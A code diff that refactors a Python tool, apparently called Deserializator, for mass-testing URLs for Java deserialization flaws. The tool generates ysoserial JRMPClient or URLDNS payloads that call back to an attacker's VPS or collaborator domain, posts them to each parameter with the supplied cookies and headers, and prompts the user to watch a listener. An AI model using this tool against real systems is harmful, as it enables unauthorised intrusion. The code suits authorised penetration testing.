@@ -46,14 +46,14 @@ def import_cookies(cookie):
     #cookie_header = cookie.split(":")[0]
     cookie_values = cookie.split(":")[1].split(";")[:-1]
     for q in cookie_values:
-        cookies.update(dict([q.lstrip().split("=")]))
+        cookies |= dict([q.lstrip().split("=")])
     return cookies
 
 
 def change_get_to_post(url):
     '''Transform 'https://url.com/a?query=x&b=qweqwe' to ('https://url.com/a', {'query': 'x', 'b': 'qweqwe'})'''
     parsed=urlparse.urlparse(url)
-    new_url=parsed.scheme + "://" + parsed.netloc + parsed.path
+    new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
     data_to_post_dict=dict(urlparse.parse_qs(parsed.query))
     return new_url, data_to_post_dict
 
@@ -62,14 +62,18 @@ def generate_ysoserial(payload_id, ip_or_domain):
     '''Return URLDNS payload if ip_or_domain is a domain or JRMPClient payload if ip_or_domain is an ip addr'''
     try:
         IP(ip_or_domain)
-        command = os.popen("java -jar $HOME/tools/ysoserial/ysoserial.jar JRMPClient '"+ip_or_domain+":80'")
+        command = os.popen(
+            f"java -jar $HOME/tools/ysoserial/ysoserial.jar JRMPClient '{ip_or_domain}:80'"
+        )
         result = command.read()
         command.close()
         encoded = base64.b64encode(result)
         if encoded != "":
             return encoded
     except:
-        command = os.popen("java -jar $HOME/tools/ysoserial/ysoserial.jar URLDNS 'http://"+str(payload_id)+"."+ip_or_domain+"'")
+        command = os.popen(
+            f"java -jar $HOME/tools/ysoserial/ysoserial.jar URLDNS 'http://{str(payload_id)}.{ip_or_domain}'"
+        )
         result = command.read()
         command.close()
         encoded = base64.b64encode(result)
@@ -82,12 +86,9 @@ def send_payload(URL,payload,data_to_post, headers, cookies):
     s = requests.Session()
     s.cookies.update(cookies)
     s.headers.update(headers)
-    count_of_params = 0
-    for key,value in data_to_post.iteritems():
-        count_of_params += 1
-    
+    count_of_params = sum(1 for key, value in data_to_post.iteritems())
     if count_of_params == 0:
-        print(URL + " - Blank parameter value or no parameters")
+        print(f"{URL} - Blank parameter value or no parameters")
         return
     elif count_of_params == 1:
         old_data = dict(data_to_post)
@@ -113,12 +114,10 @@ except NameError: logs_name = None
 for current_argument, current_value in arguments:
     if current_argument in ("-w", "--wordlist"):
         list_of_urls = current_value
-    elif current_argument in ("-i", "--vps_ip"):
-        ip_or_domain = current_value
-    elif current_argument in ("-d", "--domain_collab"):
+    elif current_argument in ("-i", "--vps_ip", "-d", "--domain_collab"):
         ip_or_domain = current_value
     elif current_argument in ("-H", "--header"):
-        headers.update([current_value.split("=")])
+        headers |= [current_value.split("=")]
     elif current_argument in ("-c", "--cookies"):
         cookies = current_value
 ### ---
@@ -129,19 +128,16 @@ try:
         cookies = import_cookies(cookies)
     print("\033[0;31m[+]\033[0m STARTING DESERIALIZATOR - URLS TO TEST: " + str(len(open(list_of_urls).readlines())))
     with open(list_of_urls) as urls:
-        payload_id = 1
-        for url in urls:
+        for payload_id, url in enumerate(urls, start=1):
             new_url, data_to_post = change_get_to_post(url.rstrip())
             payload = generate_ysoserial(payload_id, ip_or_domain)
-            print("ID: " + str(payload_id) + " - URLs: ")
+            print(f"ID: {str(payload_id)} - URLs: ")
             try:
                 send_payload(new_url, payload, data_to_post, headers, cookies)
             except KeyboardInterrupt:
                 sys.exit(0)
             except:
                 print(url)
-                pass
-            payload_id += 1
     print("\033[0;31m[+][+]\033[0m CHECK FOR PINGs ON YOUR LISTENER")
 
 except:
